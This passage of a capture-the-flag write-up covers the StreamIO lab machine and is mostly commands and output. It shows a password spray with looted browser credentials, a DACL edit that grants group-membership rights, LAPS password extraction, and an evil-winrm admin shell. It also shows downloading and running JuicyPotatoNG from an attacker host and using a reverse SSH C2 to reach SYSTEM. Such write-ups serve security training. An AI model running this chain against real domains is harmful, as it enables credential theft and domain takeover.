    "CreateDate": "2022-02-22T02:41:10-08:00"
  },
  {
    "UserName": "admin",
    "Password": "JDg0dd1s@d0p3cr3@t0r",
    "LoginURL": "",
    "CreateDate": "2022-02-22T02:40:56-08:00"
  }
]
```

### Password spray for AD

Generate combo list

```bash
┌──(bravosec㉿fsociety)-[~/htb/StreamIO]
└─$ cat loot/hack-browser-data/firefox_br53rxeg_default_release_password.json | jq .[].UserName -r > users_firefox.lst

┌──(bravosec㉿fsociety)-[~/htb/StreamIO]
└─$ cat loot/hack-browser-data/firefox_br53rxeg_default_release_password.json | jq .[].Password -r > pass_firefox.lst
```

Get a list of users from **ldapdomaindump** result

```bash
┌──(bravosec㉿fsociety)-[~/htb/StreamIO]
└─$ cat ldapdomaindump/domain_users.json | jq '.[].attributes.sAMAccountName[]' -r | tee ad_users.lst
yoshihide
nikk37
Martin
JDgodd
krbtgt
Guest
Administrator
```

Merge all passwords gathered so far

```bash
┌──(bravosec㉿fsociety)-[~/htb/SreamItO]
└─$ cat pass* | sort -u > pass_sum.lst
```

Brute force passwords

```bash
┌──(bravosec㉿fsociety)-[~/htb/StreamIO]
└─$ /opt/sectools/ad/smartbrute/smartbrute.py brute -bU users_ad.lst -bP pass_sum.lst kerberos -d streamIO.htb

/opt/sectools/ad/smartbrute/smartbrute.py:1727: DeprecationWarning: Nesting argument groups is deprecated.
  kerberos_credentials = kerberos_secrets.add_argument_group("credentials to use")
[*] Starting bruteforce attack on passwords
┌──────────────┬────────┬──────────────────────────┬──────────┐
│ domain       │ user   │ password                 │ details  │
├──────────────┼────────┼──────────────────────────┼──────────┤
│ streamIO.htb │ nikk37 │ get_dem_girls2@yahoo.com │          │
│ streamIO.htb │ JDgodd │ JDg0dd1s@d0p3cr3@t0r     │          │
│ streamIO.htb │ krbtgt │ n/a                      │ disabled │
│ streamIO.htb │ Guest  │ n/a                      │ disabled │
└──────────────┴────────┴──────────────────────────┴──────────┘
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/StreamIO]
└─$ nxc smb streamIO.htb -u 'JDgodd' -p 'JDg0dd1s@d0p3cr3@t0r'
SMB         10.129.50.51    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False)
SMB         10.129.50.51    445    DC               [+] streamIO.htb\JDgodd:JDg0dd1s@d0p3cr3@t0r
```


## Shell as Administrator


### Enumeration

`JDgodd` is not in `Remote Management Users` group, so I should focus on SMB and LDAP

```bash
┌──(bravosec㉿fsociety)-[~/htb/StreamIO]
└─$ nxc smb streamIO.htb -u 'JDgodd' -p 'JDg0dd1s@d0p3cr3@t0r' --shares
SMB         10.129.50.51    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False)
SMB         10.129.50.51    445    DC               [+] streamIO.htb\JDgodd:JDg0dd1s@d0p3cr3@t0r
SMB         10.129.50.51    445    DC               [*] Enumerated shares
SMB         10.129.50.51    445    DC               Share           Permissions     Remark
SMB         10.129.50.51    445    DC               -----           -----------     ------
SMB         10.129.50.51    445    DC               ADMIN$                          Remote Admin
SMB         10.129.50.51    445    DC               C$                              Default share
SMB         10.129.50.51    445    DC               IPC$            READ            Remote IPC
SMB         10.129.50.51    445    DC               NETLOGON        READ            Logon server share
SMB         10.129.50.51    445    DC               SYSVOL          READ            Logon server share
```

Dump domain data with **bloodhound**

```bash
┌──(bravosec㉿fsociety)-[~/htb/StreamIO]
└─$ mkdir -p bloodhound-result && cd bloodhound-result && bloodhound-python -d streamIO.htb -ns 10.129.50.51 -u 'JDgodd' -p 'JDg0dd1s@d0p3cr3@t0r' -c all
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/StreamIO]
└─$ sudo neo4j start
```

### Read LAPS password

Mark owned users as owned

![](/assets/obsidian/b8484aea6c93fe53852198b3ffddede0.png)

Find shortest path from Owned Principals

![](/assets/obsidian/dc319842c6d8b1a04cee65e27815019b.png)

![](/assets/obsidian/d102d7c86a766a27a8e03c7c5687c363.png)

- `Core Staff` can read `LAPS Password` from DC
- `JDGODD` can add users to `Core Staff` group

![](/assets/obsidian/b61f4ee4e9bbf26944d71f0b6de44186.png)

> **What is LAPS?**
> **LAPS** (Local Administrator Password Solution) will mange local Administrator password for domain computers
{: .prompt-tip }

> **Info**
> In order to use `dacledit.py`, use [shutdownrepo's impacket branch](https://github.com/ShutdownRepo/impacket/tree/dacledit)
{: .prompt-tip }

Give `JDgodd` rights to write members to `CORE STAFF`

```bash
┌──(bravosec㉿fsociety)-[/opt/sectools/ad/impacket-shutdownrepo]
└─$ pipenv shell
Launching subshell in virtual environment...
 . /home/kali/.local/share/virtualenvs/impacket-shutdownrepo-TDbuqu7G/bin/activate
┌──(bravosec㉿fsociety)-[/opt/sectools/ad/impacket-shutdownrepo]
└─$  . /home/kali/.local/share/virtualenvs/impacket-shutdownrepo-TDbuqu7G/bin/activate

┌──(impacket-shutdownrepo-TDbuqu7G)─(bravosec㉿fsociety)-[/opt/sectools/ad/impacket-shutdownrepo]
└─$ dacledit.py -action 'write' -rights 'WriteMembers' -principal 'JDgodd' -target-dn 'CN=CORE STAFF,CN=USERS,DC=STREAMIO,DC=HTB' 'streamIO.htb'/'JDgodd':'JDg0dd1s@d0p3cr3@t0r'
Impacket v0.9.25.dev1+20230823.145202.4518279 - Copyright 2021 SecureAuth Corporation

[*] DACL backed up to dacledit-20240119-060546.bak
[*] DACL modified successfully!
```

Add `nikk37` to `Core Staff` group

```bash
┌──(bravosec㉿fsociety)-[~/htb/StreamIO]
└─$ net rpc group addmem "Core Staff" "nikk37" -U "streamIO.htb"/"JDgodd"%"JDg0dd1s@d0p3cr3@t0r" -S "DC.streamIO.htb"
```

Read LAPS password

> https://github.com/p0dalirius/pyLAPS

```bash
┌──(bravosec㉿fsociety)-[/opt/sectools/ad/pyLAPS]
└─$ python pyLAPS.py --action get -d "streamIO.htb" -u "nikk37" -p "get_dem_girls2@yahoo.com"
                 __    ___    ____  _____
    ____  __  __/ /   /   |  / __ \/ ___/
   / __ \/ / / / /   / /| | / /_/ /\__ \
  / /_/ / /_/ / /___/ ___ |/ ____/___/ /
 / .___/\__, /_____/_/  |_/_/    /____/    v1.2
/_/    /____/           @podalirius_

[+] Extracting LAPS passwords of all computers ...
  | DC$                  : 2ktYJtM$&!o@![
```


### Evil-Winrm

```bash
┌──(bravosec㉿fsociety)-[/opt/sectools/ad/pyLAPS]
└─$ evil-winrm -i DC.streamIO.htb -u 'Administrator' -p '2ktYJtM$&!o@!['

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
streamio\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat ..\Desktop\root.txt
Cannot find path 'C:\Users\Administrator\Desktop\root.txt' because it does not exist.
At line:1 char:1
+ cat ..\Desktop\root.txt
+ ~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (C:\Users\Administrator\Desktop\root.txt:String) [Get-Content], ItemNotFoundException
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetContentCommand
```

Find root flag

```bash
*Evil-WinRM* PS C:\Users\Administrator\Documents> (ls -Force C:\Users\*\Desktop\* | sort LastWriteTime) 2>$null
[...]
    Directory: C:\Users\Martin\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        1/18/2024  11:09 AM             34 root.txt
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat C:\Users\Martin\Desktop\root.txt
363bf79ddcb806464d02729dc0f38124
```

# Additional
---

## From yoshihide to SYTEM


### Abuse privilege tokens

```bash
PS C:\inetpub\streamio.htb\admin> whoami /priv | sls impersonate

SeImpersonatePrivilege        Impersonate a client after authentication Enabled

```

```bash
PS C:\inetpub\streamio.htb\admin> iwr 10.10.14.21/win/JuicyPotatoNG.exe -o \programdata\j.exe
PS C:\inetpub\streamio.htb\admin> C:\ProgramData\j.exe -t * -p "C:\ProgramData\client.exe"


         JuicyPotatoNG
         by decoder_it & splinter_code

[*] Testing CLSID {854A20FB-2D44-457D-992F-EF13785D2B51} - COM server port 10247
[+] authresult success {854A20FB-2D44-457D-992F-EF13785D2B51};NT AUTHORITY\SYSTEM;Impersonation
[+] CreateProcessAsUser OK
[+] Exploit successful!
```

```bash
┌──(bravosec㉿fsociety)-[/opt/sectools/c2/reverse_ssh/bin]
└─$ ssh 127.0.0.1 -p 443 ls -t
                            Targets
+------------------------------------------+--------------------------+
| IDs                                      | Version                  |
+------------------------------------------+--------------------------+
| 12123915a4ac507c9cdb18f08e574db243740807 | SSH-v2.4.1-windows_amd64 |
| 4560e76350de6d8c31090d0eabcd9a9da8c8c58b |                          |
| nt.authority.system.dc                   |                          |
| 10.129.62.216:63503                      |                          |
+------------------------------------------+--------------------------+
| 42ead789a09ec20d05c3d1051b821158f1f1f0af | SSH-v2.4.1-windows_amd64 |
| 4560e76350de6d8c31090d0eabcd9a9da8c8c58b |                          |
| unknown.dc                               |                          |
| 10.129.62.216:63066                      |                          |
+------------------------------------------+--------------------------+
```

```bash
┌──(bravosec㉿fsociety)-[/opt/sectools/c2/reverse_ssh/bin]
└─$ ssh -J 127.0.0.1:443 nt.authority.system.dc
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\> whoami
nt authority\system
```